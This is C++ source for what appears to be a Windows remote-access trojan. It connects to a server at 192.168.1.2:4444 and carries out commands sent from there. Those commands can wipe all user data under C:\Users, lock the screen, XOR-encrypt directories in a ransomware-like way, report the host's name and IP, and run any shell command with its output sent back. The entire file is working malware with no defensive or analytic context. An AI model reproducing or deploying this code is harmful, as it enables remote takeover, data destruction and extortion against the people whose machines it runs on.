#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <filesystem>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "Ws2_32.lib")

namespace fs = std::filesystem;

SOCKET sock;

// Locate the agent's current details
std::string locate_agent() {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    std::ostringstream location;
    location << "Hostname: " << hostname;

    // Using getaddrinfo to fetch the IP address of the local machine
    struct addrinfo hints, *res;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    // Get the address info for the local machine
    if (getaddrinfo(hostname, NULL, &hints, &res) == 0) {
        struct sockaddr_in* sockaddr_ipv4 = (struct sockaddr_in*)res->ai_addr;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &(sockaddr_ipv4->sin_addr), ip, INET_ADDRSTRLEN);
        location << ", IP: " << ip;
        freeaddrinfo(res);
    }

    return location.str();
}

// Delete all user data with enhanced error handling
std::string clear_all_data() {
    std::string result = "Data clearing failed.";
    try {
        for (const auto& entry : fs::recursive_directory_iterator("C:\\Users\\")) {
            try {
                // Attempt to delete the file or directory
                std::string path = entry.path().string();

                if (fs::is_directory(entry)) {
                    // Skip system directories that are inaccessible (e.g., Windows system folders)
                    if (path.find("C:\\Users\\Public") != std::string::npos || path.find("C:\\Users\\Default") != std::string::npos) {
                        continue;
                    }
                }

                fs::remove_all(entry.path());  // Attempt to delete the file/directory
                std::cout << "Successfully deleted: " << path << std::endl;

            } catch (const std::filesystem::filesystem_error& e) {
                // Capture specific filesystem errors like access denied or invalid argument
                result = "Failed to delete: " + entry.path().string() + " with error: " + e.what();
                std::cerr << "Error deleting file: " << entry.path().string() << " Error: " << e.what() << std::endl;
                continue;  // Continue with the next file even if one fails
            } catch (const std::exception& e) {
                // Catch other exceptions (e.g., std::bad_alloc)
                result = "Error during data deletion: " + std::string(e.what());
                std::cerr << "Unexpected error: " << e.what() << std::endl;
                continue;
            }
        }
        result = "All user data cleared.";
    } catch (const std::exception& e) {
        result = "Error during data deletion loop: " + std::string(e.what());
        std::cerr << "Error in data deletion loop: " << e.what() << std::endl;
    }
    return result;
}

// Lock the user session
void lock_user() {
    LockWorkStation(); // Windows API function to lock the screen
}

// Simple XOR encryption (this is a very basic form of encryption)
void xor_encrypt_decrypt(const std::string& file_path, const std::string& key) {
    std::ifstream in(file_path, std::ios::binary); // Ensure ifstream is correctly included
    if (!in) {
        return;
    }

    std::ostringstream content;
    content << in.rdbuf(); // Read the entire file into content string
    in.close();

    // XOR the content with the key
    std::string encrypted_content = content.str();
    for (size_t i = 0; i < encrypted_content.size(); ++i) {
        encrypted_content[i] ^= key[i % key.size()];
    }

    // Write the encrypted content back to the file
    std::ofstream out(file_path, std::ios::binary);  // Ensure ofstream is correctly included
    out.write(encrypted_content.c_str(), encrypted_content.size());
}

// Encrypt files in a directory
void encrypt_data(const std::string& directory) {
    const std::string key = "MySecretKey123"; // Simple key for XOR encryption

    for (const auto& file : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(file)) {
            try {
                xor_encrypt_decrypt(file.path().string(), key);
            } catch (...) {
                continue;
            }
        }
    }
}

// Execute a command received from the server
std::string exec(const std::string& cmd) {
    char buffer[128];
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Command execution failed.";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }
    _pclose(pipe);
    return result;
}

// Handle commands from the server
void handle_command(const std::string& command) {
    int bytes_sent = 0;
    std::string response;

    if (command == "locate") {
        std::string location = locate_agent();
        response = location;
    } else if (command == "clear") {
        response = clear_all_data();
    } else if (command == "lock") {
        lock_user();
        response = "User locked successfully.";
    } else if (command.rfind("encrypt ", 0) == 0) {
        std::string directory = command.substr(8);
        encrypt_data(directory);
        response = "Data encrypted successfully.";
    } else {
        response = exec(command);
    }

    // Ensure the entire response is sent
    while (bytes_sent < response.size()) {
        int result = send(sock, response.c_str() + bytes_sent, response.size() - bytes_sent, 0);
        if (result == SOCKET_ERROR) {
            std::cerr << "Error sending response: " << WSAGetLastError() << std::endl;
            break;
        }
        bytes_sent += result;
    }

    // Optionally, handle connection termination after a specific command
    if (command == "exit") {
        std::cout << "Server requested disconnect." << std::endl;
        closesocket(sock);  // Close the socket connection if the 'exit' command is received
        WSACleanup();       // Clean up Winsock
    }
}

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.2", &server_addr.sin_addr);

    if (connect(sock, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "Connected to server." << std::endl;

    while (true) {
        char buffer[512];
        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            std::cerr << "Connection closed or error occurred." << std::endl;
            break; // Break out of the loop if connection is closed or error occurs
        }

        buffer[bytes_received] = '\0'; // Null-terminate the received string
        std::string command(buffer);

        handle_command(command); // Handle the command received from the server
    }

    closesocket(sock); // Cleanly close the socket
    WSACleanup();      // Clean up Winsock
    return 0;
}
